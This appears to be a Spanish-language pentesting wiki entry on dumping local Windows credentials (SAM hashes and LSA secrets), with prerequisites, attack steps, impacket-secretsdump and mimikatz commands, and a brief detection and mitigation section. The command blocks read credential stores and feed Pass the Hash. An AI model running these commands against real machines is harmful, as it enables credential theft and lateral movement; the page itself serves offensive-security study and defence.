---
title: Dump de credenciales locales (SAM / LSA)
resumen: Extraer hashes locales y secretos LSA de un equipo comprometido, con acceso admin local o remoto.
tags: mimikatz, impacket
---

## Definición

Extracción de credenciales almacenadas localmente en un equipo Windows: la base de datos **SAM** (*Security Account Manager*), que guarda los hashes NTLM de las cuentas locales, y los **secretos LSA**, que incluyen credenciales cacheadas de dominio y contraseñas guardadas de servicios. A diferencia de un DCSync, esto no requiere tocar el DC en vivo: basta con privilegios administrativos locales sobre la máquina objetivo.

## Cuándo se usa

Tras obtener acceso administrativo (local o remoto vía PtH/PtT) a un equipo, como paso habitual de post-explotación antes de intentar moverse a otro sistema. También es la vía de entrada cuando se pertenece al grupo **Backup Operators**, que permite hacer un backup remoto del registro sin ser administrador local pleno.

## Requisitos previos

- Privilegios administrativos locales en el equipo objetivo, o pertenencia al grupo Backup Operators para el caso remoto vía registro.
- Acceso a SMB/RPC (445/135) si se hace de forma remota.

## Desarrollo del ataque

1. Obtener acceso administrativo (local o remoto) al equipo objetivo.
2. Volcar la SAM y los secretos LSA, en local o vía red.
3. Si el volcado es a partir de hives de registro exportados, procesarlos offline.
4. Crackear los hashes NTLM obtenidos o reutilizarlos directamente vía Pass the Hash.

```bash
# Remoto, con credenciales válidas de administrador local
impacket-secretsdump 'domain.local/USER:PASSWORD'@10.10.10.10

# Dumpear a partir de hives de registro ya exportados (por ejemplo, vía Backup Operators)
impacket-secretsdump -sam registry.SAM.hive -system registry.SYSTEM.hive -security registry.SECURITY.hive LOCAL
```

```powershell
# mimikatz, en local sobre el propio equipo
privilege::debug
lsadump::sam
lsadump::secrets
```

## Herramientas relacionadas

- Ver [[mimikatz]]
- Ver [[impacket]] (secretsdump)

## Detección y mitigación

Restringir y auditar la pertenencia a grupos como Backup Operators, activar Credential Guard para dificultar el acceso a LSASS, y monitorizar accesos de lectura al registro sobre las colmenas SAM/SECURITY/SYSTEM desde procesos no habituales.
